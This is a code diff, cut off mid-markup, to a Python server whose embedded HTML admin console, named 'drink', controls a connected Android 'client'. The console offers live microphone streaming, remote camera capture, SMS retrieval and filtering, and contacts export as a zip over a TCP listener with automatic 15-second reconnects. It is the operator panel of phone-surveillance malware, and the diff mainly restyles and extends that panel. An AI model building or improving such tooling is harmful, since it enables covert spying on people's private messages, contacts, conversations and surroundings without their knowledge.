@@ -1,10 +1,12 @@
 import asyncio
+import io
 import json
 import os
 import struct
 import sys
 import threading
 import time
+import zipfile
 from collections import deque
 from pathlib import Path
 from typing import Optional, Set
@@ -32,6 +34,7 @@ state = {
     "latest_contacts": None,
     "latest_contacts_bytes": None,
     "latest_sms": [],
+    "contacts_list": [],
 }
 
 logs = deque(maxlen=100)
@@ -183,11 +186,11 @@ HTML_ADMIN_PAGE = """<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>drink — Admin Panel</title>
+<title>drink — Admin Console</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
-    background: #fbfbfd;
+    background: #f5f5f7;
     color: #1d1d1f;
     font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Helvetica Neue", Helvetica, Arial, sans-serif;
     padding: 0 0 60px 0;
@@ -201,79 +204,206 @@ HTML_ADMIN_PAGE = """<!DOCTYPE html>
     position: sticky;
     top: 0;
     z-index: 100;
-    padding: 16px 28px;
+    padding: 12px 28px;
     display: flex;
     justify-content: space-between;
     align-items: center;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.02);
+  }
+  .brand-group {
+    display: flex;
+    align-items: center;
+    gap: 14px;
   }
   .brand {
-    font-size: 1.25rem;
+    font-size: 1.35rem;
     font-weight: 700;
     letter-spacing: -0.03em;
+    color: #1d1d1f;
+  }
+  .status-pills {
     display: flex;
     align-items: center;
     gap: 8px;
   }
-  .badge {
-    font-size: 0.72rem;
-    padding: 3px 9px;
-    border-radius: 980px;
+  .pill {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 0.75rem;
     font-weight: 600;
-    letter-spacing: 0.02em;
-    text-transform: uppercase;
+    padding: 4px 10px;
+    border-radius: 980px;
+    background: #e5e5ea;
+    color: #8e8e93;
+    transition: all 0.2s ease;
   }
-  .badge-off { background: #f2f2f7; color: #8e8e93; }
-  .badge-on { background: #e4f7e8; color: #34c759; }
-  .badge-warn { background: #fff3db; color: #ff9500; }
-  .badges-group {
+  .pill-dot {
+    width: 7px;
+    height: 7px;
+    border-radius: 50%;
+    background: #8e8e93;
+  }
+  .pill-on {
+    background: #e4f7e8;
+    color: #248a3d;
+  }
+  .pill-on .pill-dot {
+    background: #34c759;
+    box-shadow: 0 0 8px rgba(52, 199, 89, 0.8);
+  }
+  .pill-warn {
+    background: #fff4e5;
+    color: #b25e00;
+  }
+  .pill-warn .pill-dot {
+    background: #ff9500;
+  }
+  .action-bar {
     display: flex;
-    gap: 8px;
+    align-items: center;
+    gap: 10px;
+  }
+  .circle-btn {
+    width: 38px;
+    height: 38px;
+    border-radius: 50%;
+    border: none;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+    position: relative;
+  }
+  .circle-btn:hover {
+    transform: scale(1.08);
+  }
+  .circle-btn:active {
+    transform: scale(0.94);
+  }
+  .circle-start {
+    background: #34c759;
+    color: #ffffff;
+    box-shadow: 0 2px 8px rgba(52, 199, 89, 0.35);
+  }
+  .circle-start.active {
+    box-shadow: 0 0 0 3px rgba(52, 199, 89, 0.3), 0 2px 8px rgba(52, 199, 89, 0.5);
+  }
+  .circle-stop {
+    background: #ff9500;
+    color: #ffffff;
+    box-shadow: 0 2px 8px rgba(255, 149, 0, 0.35);
+  }
+  .circle-kill {
+    background: #ff3b30;
+    color: #ffffff;
+    box-shadow: 0 2px 8px rgba(255, 59, 48, 0.35);
+  }
+  .circle-disconnect {
+    background: #5856d6;
+    color: #ffffff;
+    box-shadow: 0 2px 8px rgba(88, 86, 214, 0.35);
   }
   .container {
-    max-width: 1080px;
-    margin: 32px auto 0 auto;
-    padding: 0 24px;
+    max-width: 1120px;
+    margin: 28px auto 0 auto;
+    padding: 0 20px;
   }
   .grid {
     display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
-    gap: 20px;
-    margin-bottom: 24px;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 18px;
+    margin-bottom: 20px;
+  }
+  @media (max-width: 960px) {
+    .grid { grid-template-columns: repeat(2, 1fr); }
+  }
+  @media (max-width: 640px) {
+    .grid { grid-template-columns: 1fr; }
+    header { flex-direction: column; gap: 12px; align-items: flex-start; }
   }
   .card {
     background: #ffffff;
     border: 1px solid #e5e5ea;
     border-radius: 16px;
-    padding: 24px;
+    padding: 20px;
     box-shadow: 0 2px 8px rgba(0,0,0,0.02);
     display: flex;
     flex-direction: column;
+    position: relative;
+  }
+  .card-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 12px;
+  }
+  .card-title-wrap {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .card-icon {
+    width: 28px;
+    height: 28px;
+    border-radius: 7px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: #f5f5f7;
+    color: #1d1d1f;
   }
   .card-title {
-    font-size: 1.05rem;
+    font-size: 0.98rem;
     font-weight: 600;
-    margin-bottom: 6px;
     letter-spacing: -0.01em;
   }
-  .card-desc {
-    color: #86868b;
+  .btn-icon-link {
+    background: transparent;
+    border: none;
+    cursor: pointer;
+    color: #0071e3;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    padding: 4px;
+    border-radius: 6px;
+    transition: background 0.15s;
+  }
+  .btn-icon-link:hover {
+    background: #f2f2f7;
+  }
+  .stat-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
     font-size: 0.82rem;
-    margin-bottom: 18px;
+    padding: 6px 0;
+    border-bottom: 1px solid #f5f5f7;
+  }
+  .stat-label { color: #86868b; }
+  .stat-val { font-weight: 500; font-family: ui-monospace, SFMono-Regular, monospace; }
+  .card-body {
+    margin-top: 8px;
+    flex: 1;
+    display: flex;
+    flex-direction: column;
   }
   .card-actions {
-    margin-top: auto;
+    margin-top: 14px;
     display: flex;
-    flex-wrap: wrap;
     gap: 8px;
+    flex-wrap: wrap;
   }
   button, .btn-link {
     cursor: pointer;
     border: none;
     border-radius: 8px;
-    padding: 8px 14px;
-    font-size: 0.85rem;
+    padding: 7px 12px;
+    font-size: 0.82rem;
     font-weight: 500;
-    transition: all 0.15s ease-in-out;
+    transition: all 0.15s ease;
     text-decoration: none;
     display: inline-flex;
     align-items: center;
@@ -286,48 +416,24 @@ HTML_ADMIN_PAGE = """<!DOCTYPE html>
   .btn-secondary:hover { background: #e8e8ed; }
   .btn-danger { background: #fff; color: #ff3b30; border: 1px solid #ffd1d0; }
   .btn-danger:hover { background: #ffebeb; }
+  .btn-outline { background: #fff; color: #0071e3; border: 1px solid #c7e0f9; }
+  .btn-outline:hover { background: #f0f7ff; }
   .btn-green { background: #34c759; color: #fff; }
   .btn-green:hover { background: #2ebd52; }
-  input[type="number"], input[type="text"] {
+  input[type="text"], input[type="number"], input[type="date"] {
     border: 1px solid #d2d2d7;
     border-radius: 8px;
-    padding: 8px 12px;
-    font-size: 0.85rem;
+    padding: 6px 10px;
+    font-size: 0.82rem;
     outline: none;
+    background: #fff;
     transition: border-color 0.15s;
   }
-  input[type="number"]:focus, input[type="text"]:focus {
+  input[type="text"]:focus, input[type="number"]:focus, input[type="date"]:focus {
     border-color: #0071e3;
   }
-  .field-row {
-    display: flex;
-    align-items: center;
-    gap: 8px;
-    margin-bottom: 12px;
-  }
-  .stat-row {
-    display: flex;
-    justify-content: space-between;
-    font-size: 0.82rem;
-    padding: 6px 0;
-    border-bottom: 1px solid #f2f2f7;
-  }
-  .stat-label { color: #86868b; }
-  .stat-val { font-weight: 500; }
-  .log-console {
-    background: #1c1c1e;
-    color: #30d158;
-    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
-    font-size: 0.78rem;
-    padding: 16px;
-    border-radius: 12px;
-    height: 180px;
-    overflow-y: auto;
-    white-space: pre-wrap;
-    line-height: 1.45;
-  }
   .preview-box {
-    margin-top: 14px;
+    margin-top: 10px;
     border-radius: 10px;
     overflow: hidden;
     background: #f5f5f7;
@@ -335,54 +441,311 @@ HTML_ADMIN_PAGE = """<!DOCTYPE html>
     display: flex;
     align-items: center;
     justify-content: center;
-    min-height: 140px;
+    height: 120px;
+    cursor: pointer;
+    position: relative;
   }
-  .preview-img {
-    max-width: 100%;
-    height: auto;
-    display: block;
+  .preview-box img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
   }
-  .sms-list {
-    max-height: 220px;
-    overflow-y: auto;
-    border: 1px solid #e5e5ea;
-    border-radius: 8px;
-    margin-top: 12px;
-    padding: 8px;
-    background: #fafafa;
+  .preview-empty {
+    font-size: 0.78rem;
+    color: #86868b;
     display: flex;
-    flex-direction: column;
+    align-items: center;
     gap: 6px;
   }
-  .sms-item {
-    background: #fff;
-    border: 1px solid #ededed;
-    border-radius: 6px;
-    padding: 8px 10px;
-    font-size: 0.8rem;
+  .cam-pills {
+    display: flex;
+    gap: 6px;
+    flex-wrap: wrap;
+    margin-bottom: 8px;
   }
-  .sms-meta {
+  .cam-pill {
+    padding: 3px 8px;
+    border-radius: 6px;
+    font-size: 0.75rem;
+    background: #f5f5f7;
+    color: #1d1d1f;
+    border: 1px solid #e5e5ea;
+    cursor: pointer;
+  }
+  .cam-pill.active {
+    background: #0071e3;
+    color: #fff;
+    border-color: #0071e3;
+  }
+  .sms-preview-list {
+    margin-top: 10px;
+    border: 1px solid #e5e5ea;
+    border-radius: 8px;
+    padding: 6px;
+    background: #fafafa;
+    max-height: 110px;
+    overflow-y: auto;
+    display: flex;
+    flex-direction: column;
+    gap: 4px;
+  }
+  .sms-preview-item {
+    background: #fff;
+    border: 1px solid #efeff4;
+    border-radius: 6px;
+    padding: 5px 8px;
+    font-size: 0.75rem;
+    display: flex;
+    flex-direction: column;
+    gap: 2px;
+  }
+  .sms-preview-meta {
     display: flex;
     justify-content: space-between;
     color: #86868b;
-    font-size: 0.72rem;
-    margin-bottom: 4px;
+    font-size: 0.68rem;
   }
-  .sms-body {
+  .sms-preview-body {
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    color: #1d1d1f;
+  }
+  .log-console {
+    background: #1c1c1e;
+    color: #30d158;
+    font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+    font-size: 0.75rem;
+    padding: 14px;
+    border-radius: 12px;
+    height: 160px;
+    overflow-y: auto;
+    white-space: pre-wrap;
+    line-height: 1.45;
+  }
+  .modal-backdrop {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.45);
+    backdrop-filter: blur(12px);
+    -webkit-backdrop-filter: blur(12px);
+    z-index: 1000;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  .modal-container {
+    background: #ffffff;
+    border-radius: 20px;
+    box-shadow: 0 16px 40px rgba(0,0,0,0.18);
+    width: 94vw;
+    max-width: 1120px;
+    height: 86vh;
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+    border: 1px solid #e5e5ea;
+  }
+  .modal-header {
+    padding: 16px 24px;
+    border-bottom: 1px solid #e5e5ea;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    background: #fbfbfd;
+  }
+  .modal-header-left {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+  }
+  .modal-title {
+    font-size: 1.25rem;
+    font-weight: 600;
+    letter-spacing: -0.02em;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .modal-count-badge {
+    font-size: 0.78rem;
+    background: #e5e5ea;
+    color: #1d1d1f;
+    padding: 2px 8px;
+    border-radius: 980px;
+    font-weight: 600;
+  }
+  .modal-toolbar {
+    padding: 12px 24px;
+    border-bottom: 1px solid #e5e5ea;
+    display: flex;
+    gap: 12px;
+    align-items: center;
+    background: #ffffff;
+    flex-wrap: wrap;
+  }
+  .search-wrap {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    background: #f5f5f7;
+    border: 1px solid #e5e5ea;
+    border-radius: 10px;
+    padding: 6px 12px;
+    flex: 1;
+    min-width: 200px;
+  }
+  .search-wrap input {
+    border: none;
+    background: transparent;
+    width: 100%;
+    outline: none;
+    font-size: 0.85rem;
+  }
+  .modal-body {
+    flex: 1;
+    overflow-y: auto;
+    padding: 20px 24px;
+    background: #fafafa;
+  }
+  .contacts-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 12px;
+  }
+  .contact-card {
+    background: #ffffff;
+    border: 1px solid #e5e5ea;
+    border-radius: 12px;
+    padding: 12px 14px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    transition: all 0.15s;
+  }
+  .contact-card:hover {
+    box-shadow: 0 4px 12px rgba(0,0,0,0.04);
+    border-color: #d2d2d7;
+  }
+  .contact-avatar {
+    width: 38px;
+    height: 38px;
+    border-radius: 50%;
+    background: #eef4ff;
+    color: #0071e3;
+    font-weight: 600;
+    font-size: 0.9rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+  }
+  .contact-info {
+    flex: 1;
+    overflow: hidden;
+  }
+  .contact-name {
+    font-size: 0.88rem;
+    font-weight: 600;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+  .contact-phone {
+    font-size: 0.78rem;
+    color: #0071e3;
+    text-decoration: none;
+  }
+  .messages-stack {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+  }
+  .msg-bubble-card {
+    background: #ffffff;
+    border: 1px solid #e5e5ea;
+    border-radius: 14px;
+    padding: 12px 16px;
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.02);
+  }
+  .msg-meta-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.78rem;
+  }
+  .msg-dir-tag {
+    font-size: 0.7rem;
+    font-weight: 600;
+    padding: 2px 7px;
+    border-radius: 4px;
+  }
+  .msg-dir-in { background: #e4f7e8; color: #248a3d; }
+  .msg-dir-out { background: #eef4ff; color: #0071e3; }
+  .msg-text-content {
+    font-size: 0.88rem;
+    line-height: 1.4;
     color: #1d1d1f;
     word-break: break-word;
+  }
+  .filter-pills {
+    display: flex;
+    gap: 6px;
+  }
+  .filter-pill {
+    padding: 5px 10px;
+    border-radius: 8px;
+    font-size: 0.78rem;
+    font-weight: 500;
+    background: #f5f5f7;
+    color: #1d1d1f;
+    border: 1px solid #e5e5ea;
+    cursor: pointer;
+  }
+  .filter-pill.active {
+    background: #0071e3;
+    color: #ffffff;
+    border-color: #0071e3;
   }
 </style>
 </head>
 <body>
 <header>
-  <div class="brand">
-    drink
+  <div class="brand-group">
+    <div class="brand">drink</div>
+    <div class="status-pills">
+      <span class="pill" id="pillTcp">
+        <span class="pill-dot"></span>
+        <span id="txtTcp">TCP: Stopped</span>
+      </span>
+      <span class="pill" id="pillClient">
+        <span class="pill-dot"></span>
+        <span id="txtClient">Client: Disconnected</span>
+      </span>
+      <span class="pill" id="pillMic">
+        <span class="pill-dot"></span>
+        <span id="txtMic">Mic: Off</span>
+      </span>
+    </div>
   </div>
-  <div class="badges-group">
-    <span class="badge badge-off" id="tcpBadge">TCP: Stopped</span>
-    <span class="badge badge-off" id="clientBadge">Client: Disconnected</span>
-    <span class="badge badge-off" id="micBadge">Mic: Off</span>
+
+  <div class="action-bar">
+    <button class="circle-btn circle-start" id="btnStart" title="Start Listen" onclick="startServer()">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+    </button>
+    <button class="circle-btn circle-stop" id="btnStop" title="Stop Listen" onclick="stopServer()">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><rect x="6" y="6" width="12" height="12" rx="2"/></svg>
+    </button>
+    <button class="circle-btn circle-kill" title="Kill Server" onclick="killServer()">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M18.36 6.64a9 9 0 1 1-12.73 0"/><line x1="12" y1="2" x2="12" y2="12"/></svg>
+    </button>
+    <button class="circle-btn circle-disconnect" title="Disconnect Client" onclick="disconnectClient()">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6L6 18"/><path d="M6 6l12 12"/></svg>
+    </button>
   </div>
 </header>
 
@@ -390,103 +753,283 @@ HTML_ADMIN_PAGE = """<!DOCTYPE html>
   <div class="grid">
 
     <div class="card">
-      <div class="card-title">Server Controls</div>
-      <div class="card-desc">TCP listener and process management</div>
-      <div class="stat-row">
-        <span class="stat-label">TCP Target</span>
-        <span class="stat-val" id="tcpAddr">192.168.1.149:33110</span>
+      <div class="card-header">
+        <div class="card-title-wrap">
+          <div class="card-icon">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"/><rect x="2" y="14" width="20" height="8" rx="2" ry="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>
+          </div>
+          <span class="card-title">Server Host</span>
+        </div>
       </div>
-      <div class="stat-row">
-        <span class="stat-label">Web Console</span>
-        <span class="stat-val">Port 3000</span>
+      <div class="card-body">
+        <div class="stat-row">
+          <span class="stat-label">TCP Target</span>
+          <span class="stat-val" id="valTcpHost">192.168.1.149:33110</span>
+        </div>
+        <div class="stat-row">
+          <span class="stat-label">Web Console</span>
+          <span class="stat-val">0.0.0.0:3000</span>
+        </div>
+        <div class="stat-row">
+          <span class="stat-label">Listen State</span>
+          <span class="stat-val" id="valListenState">Idle</span>
+        </div>
       </div>
-      <div class="card-actions" style="margin-top: 16px;">
-        <button class="btn-primary" id="btnStartServer" onclick="startServer()">Start Listen</button>
-        <button class="btn-secondary" id="btnStopServer" onclick="stopServer()">Stop Listen</button>
-        <button class="btn-danger" onclick="killServer()">Kill Server</button>
+      <div class="card-actions">
+        <button class="btn-primary" onclick="startServer()">Start Listen</button>
+        <button class="btn-secondary" onclick="stopServer()">Stop Listen</button>
       </div>
     </div>
 
     <div class="card">
-      <div class="card-title">Android Client</div>
-      <div class="card-desc">Active socket session status</div>
-      <div class="stat-row">
-        <span class="stat-label">Remote Address</span>
-        <span class="stat-val" id="clientAddr">None</span>
+      <div class="card-header">
+        <div class="card-title-wrap">
+          <div class="card-icon">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
+          </div>
+          <span class="card-title">Android Client</span>
+        </div>
       </div>
-      <div class="stat-row">
-        <span class="stat-label">Connection Status</span>
-        <span class="stat-val" id="clientStatusText">Waiting for client…</span>
+      <div class="card-body">
+        <div class="stat-row">
+          <span class="stat-label">Remote Address</span>
+          <span class="stat-val" id="valClientAddr">Disconnected</span>
+        </div>
+        <div class="stat-row">
+          <span class="stat-label">Session Status</span>
+          <span class="stat-val" id="valClientStatus">Waiting for connection…</span>
+        </div>
+        <div class="stat-row">
+          <span class="stat-label">Retry Interval</span>
+          <span class="stat-val">15s automatic</span>
+        </div>
       </div>
-      <div class="card-actions" style="margin-top: 16px;">
+      <div class="card-actions">
         <button class="btn-danger" onclick="disconnectClient()">Disconnect Client</button>
       </div>
     </div>
 
     <div class="card">
-      <div class="card-title">Microphone Stream</div>
-      <div class="card-desc">Live 16kHz PCM audio streaming</div>
-      <div class="stat-row">
-        <span class="stat-label">Stream Status</span>
-        <span class="stat-val" id="micStatusText">Inactive</span>
+      <div class="card-header">
+        <div class="card-title-wrap">
+          <div class="card-icon">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/><line x1="8" y1="23" x2="16" y2="23"/></svg>
+          </div>
+          <span class="card-title">Microphone Stream</span>
+        </div>
+        <a href="/mic" target="_blank" class="btn-icon-link" title="Open in standalone tab">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
+        </a>
       </div>
-      <div class="card-actions" style="margin-top: 16px;">
+      <div class="card-body">
+        <div class="stat-row">
+          <span class="stat-label">Stream Mode</span>
+          <span class="stat-val" id="valMicStatus">Inactive</span>
+        </div>
+        <div class="stat-row">
+          <span class="stat-label">Audio Route</span>
+          <span class="stat-val">/mic (/ws/audio)</span>
+        </div>
+      </div>
+      <div class="card-actions">
         <button class="btn-green" onclick="startMic()">Start Mic</button>
         <button class="btn-secondary" onclick="stopMic()">Stop Mic</button>
-        <a href="/mic" target="_blank" class="btn-link btn-secondary">Open Mic Page ↗</a>
       </div>
     </div>
 
     <div class="card">
-      <div class="card-title">Camera Management</div>
-      <div class="card-desc">Camera detection and still image capture</div>
-      <div class="field-row">
-        <button class="btn-secondary" onclick="listCameras()">List Cameras</button>
-        <div id="cameraButtons" style="display: flex; gap: 6px; flex-wrap: wrap;"></div>
+      <div class="card-header">
+        <div class="card-title-wrap">
+          <div class="card-icon">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
+          </div>
+          <span class="card-title">Camera Capture</span>
+        </div>
+        <button class="btn-icon-link" onclick="openPhotoModal()" title="View full size photo">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 3h6v6"/><path d="M9 21H3v-6"/><path d="M21 3l-7 7"/><path d="M3 21l7-7"/></svg>
+        </button>
       </div>
-      <div class="field-row">
-        <input type="number" id="camIdInput" placeholder="Camera ID" value="0" style="width: 100px;">
-        <button class="btn-primary" onclick="captureCamera()">Use Cam</button>
+      <div class="card-body">
+        <div class="cam-pills" id="camPillsBox"></div>
+        <div class="preview-box" id="camPreviewBox" onclick="openPhotoModal()">
+          <span class="preview-empty" id="camPreviewEmpty">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
+            No photo captured
+          </span>
+          <img id="camPreviewImg" style="display: none;">
+        </div>
       </div>
-      <div class="preview-box" id="cameraPreview">
-        <span style="font-size: 0.8rem; color: #86868b;">No photo captured</span>
-      </div>
-    </div>
-
-    <div class="card">
-      <div class="card-title">Contacts</div>
-      <div class="card-desc">Download address book as zip archive</div>
       <div class="card-actions">
-        <button class="btn-primary" onclick="getContacts()">Pull Contacts</button>
-        <a href="/api/contacts/download" id="btnDownloadContacts" class="btn-link btn-secondary" style="display: none;">Download contacts.zip</a>
+        <button class="btn-secondary" onclick="listCameras()">List Cams</button>
+        <button class="btn-primary" onclick="captureSelectedCamera()">Take Photo</button>
       </div>
     </div>
 
     <div class="card">
-      <div class="card-title">SMS Messages</div>
-      <div class="card-desc">Query device SMS database</div>
-      <div class="field-row">
-        <input type="number" id="smsHoursInput" value="24" style="width: 100px;" placeholder="Hours">
-        <button class="btn-primary" onclick="getSms()">Get SMS</button>
+      <div class="card-header">
+        <div class="card-title-wrap">
+          <div class="card-icon">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+          </div>
+          <span class="card-title">SMS Messages</span>
+        </div>
+        <button class="btn-icon-link" onclick="openSmsModal()" title="Fullscreen SMS Viewer">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 3h6v6"/><path d="M9 21H3v-6"/><path d="M21 3l-7 7"/><path d="M3 21l7-7"/></svg>
+        </button>
       </div>
-      <div class="sms-list" id="smsContainer">
-        <span style="font-size: 0.8rem; color: #86868b; padding: 4px;">No messages loaded</span>
+      <div class="card-body">
+        <div style="display: flex; gap: 8px; align-items: center;">
+          <input type="number" id="cardSmsHours" value="24" style="width: 76px;" placeholder="Hours">
+          <button class="btn-primary" onclick="getSmsFromCard()">Get SMS</button>
+          <button class="btn-outline" onclick="openSmsModal()">Fullscreen</button>
+        </div>
+        <div class="sms-preview-list" id="cardSmsList">
+          <span style="font-size: 0.72rem; color: #86868b; padding: 4px;">No messages loaded</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <div class="card-title-wrap">
+          <div class="card-icon">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+          </div>
+          <span class="card-title">Contacts</span>
+        </div>
+        <button class="btn-icon-link" onclick="openContactsModal()" title="Fullscreen Contacts Viewer">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 3h6v6"/><path d="M9 21H3v-6"/><path d="M21 3l-7 7"/><path d="M3 21l7-7"/></svg>
+        </button>
+      </div>
+      <div class="card-body">
+        <div class="stat-row">
+          <span class="stat-label">Contacts Count</span>
+          <span class="stat-val" id="valContactsCount">0</span>
+        </div>
+        <div class="stat-row">
+          <span class="stat-label">Storage</span>
+          <span class="stat-val">contacts.zip</span>
+        </div>
+      </div>
+      <div class="card-actions">
+        <button class="btn-primary" onclick="pullContacts()">Pull Contacts</button>
+        <button class="btn-outline" onclick="openContactsModal()">View List</button>
+        <a href="/api/contacts/download" id="btnDlZipCard" class="btn-link btn-secondary" style="display: none;">Download ZIP</a>
       </div>
     </div>
 
   </div>
 
-  <div class="card" style="margin-top: 8px;">
-    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
-      <div class="card-title" style="margin: 0;">Live Activity Console</div>
-      <button class="btn-secondary" style="padding: 4px 10px; font-size: 0.75rem;" onclick="clearLogs()">Clear</button>
+  <div class="card" style="margin-top: 4px;">
+    <div class="card-header">
+      <div class="card-title-wrap">
+        <div class="card-icon">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
+        </div>
+        <span class="card-title">Activity Console</span>
+      </div>
+      <button class="btn-secondary" style="padding: 4px 8px; font-size: 0.72rem;" onclick="clearLogs()">Clear</button>
     </div>
     <div class="log-console" id="logConsole"></div>
   </div>
 </div>
 
+<div class="modal-backdrop" id="smsModalBackdrop">
+  <div class="modal-container">
+    <div class="modal-header">
+      <div class="modal-header-left">
+        <button class="btn-secondary" onclick="closeSmsModal()">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"/></svg>
+          Back
+        </button>
+        <div class="modal-title">
+          Messages
+          <span class="modal-count-badge" id="modalSmsCount">0</span>
+        </div>
+      </div>
+      <button class="btn-secondary" onclick="closeSmsModal()">✕</button>
+    </div>
+
+    <div class="modal-toolbar">
+      <div class="search-wrap">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+        <input type="text" id="smsSearchInput" placeholder="Search number or message content…" oninput="filterMessages()">
+      </div>
+
+      <div style="display: flex; align-items: center; gap: 6px;">
+        <input type="date" id="smsDatePicker" onchange="filterMessages()" title="Filter by specific date">
+        <button class="btn-secondary" style="padding: 6px 10px;" onclick="clearSmsDateFilter()" title="Clear date filter">Clear</button>
+      </div>
+
+      <div class="filter-pills">
+        <button class="filter-pill active" id="pillDirAll" onclick="setDirFilter('all')">All</button>
+        <button class="filter-pill" id="pillDirIn" onclick="setDirFilter('in')">Received</button>
+        <button class="filter-pill" id="pillDirOut" onclick="setDirFilter('out')">Sent</button>
+      </div>
+
+      <div style="display: flex; align-items: center; gap: 6px; margin-left: auto;">
+        <input type="number" id="modalSmsHours" value="24" style="width: 70px;" placeholder="Hours">
+        <button class="btn-primary" onclick="getSmsFromModal()">Fetch SMS</button>
+      </div>
+    </div>
+
+    <div class="modal-body">
